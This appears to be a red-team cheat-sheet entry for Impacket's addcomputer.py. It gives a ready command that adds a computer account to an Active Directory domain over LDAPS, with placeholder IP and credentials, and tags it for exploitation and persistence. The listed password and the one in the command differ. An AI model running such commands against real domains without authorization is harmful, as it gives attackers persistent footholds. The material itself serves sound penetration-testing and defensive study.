      file: Impacket-addcomputer-LDAPS.md
      document: "---\ndescription: |\n  Impacket's addcomputer.py will add a computer account to the domain\
        \ and set its password. The following command will create a new computer over LDAPS. Plain LDAP\
        \ is not supported, as it doesn't allow setting the password of the new computer.\n\n  Command\
        \ Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\n  \tNew Computer Password:\
        \ TestPassword123\n\n  \tNew Computer Name: testComputer\n\n  \tUsername: john\n\n  \tPassword:\
        \ password123\n\ncommand: |\n  python3 addcomputer.py -method LDAPS -dc-ip 10.10.10.1 -computer-pass\
        \ TestPassword321 -computer-name testComputer test.local/john:password123\nitems:\n  - Username\n\
        \  - Password\nservices:\n  - LDAP\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n\
        \  - Persistence\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py\n\
        \  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\n---\n"
